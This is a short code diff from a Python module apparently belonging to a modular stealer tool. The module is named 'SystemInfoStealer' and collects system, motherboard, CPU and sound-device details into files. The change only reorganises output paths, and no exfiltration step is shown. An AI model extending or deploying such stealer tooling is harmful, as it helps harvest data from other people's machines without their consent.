@@ -9,7 +9,7 @@ class SystemInfoRecovery(ModuleManager):
     Module for gathering system information and saving it to files.
     """
     def __init__(self) -> None:
-        super().__init__(module_name = "SystemInfoStealer")
+        super().__init__(module_name = "SystemInfoStealer", module_path="systeminfo/general")
         
         self.banner(r"""
          _______          ______                              
@@ -22,15 +22,12 @@ class SystemInfoRecovery(ModuleManager):
       `-=========-`()                Information
                     """)
 
-        self.systeminfo_folder: Path = self.output_folder_user / "system"
-        self.systeminfo_filename: Path = self.systeminfo_folder / "systeminfo.txt"
-        self.computerinfo_filename: Path = self.systeminfo_folder / "computerinfo.txt"
-        self.motherboard_filename: Path = self.systeminfo_folder / "motherboard.txt"
-        self.cpu_filename: Path = self.systeminfo_folder / "cpu.txt"
-        self.sounds_filename: Path = self.systeminfo_folder / "sounds.txt"
+        self.systeminfo_filename: Path = self.module_output / "systeminfo.txt"
+        self.computerinfo_filename: Path = self.module_output / "computerinfo.txt"
+        self.motherboard_filename: Path = self.module_output / "motherboard.txt"
+        self.cpu_filename: Path = self.module_output / "cpu.txt"
+        self.sounds_filename: Path = self.module_output / "sounds.txt"
 
-        self.systeminfo_folder.mkdir(parents=True, exist_ok=True)
-            
     def systeminfo(self) -> None:
         self.mdebug("[systeminfo] Running command: `systeminfo`")
         data = subprocess.check_output(["systeminfo"]).decode("utf-8", errors="backslashreplace")
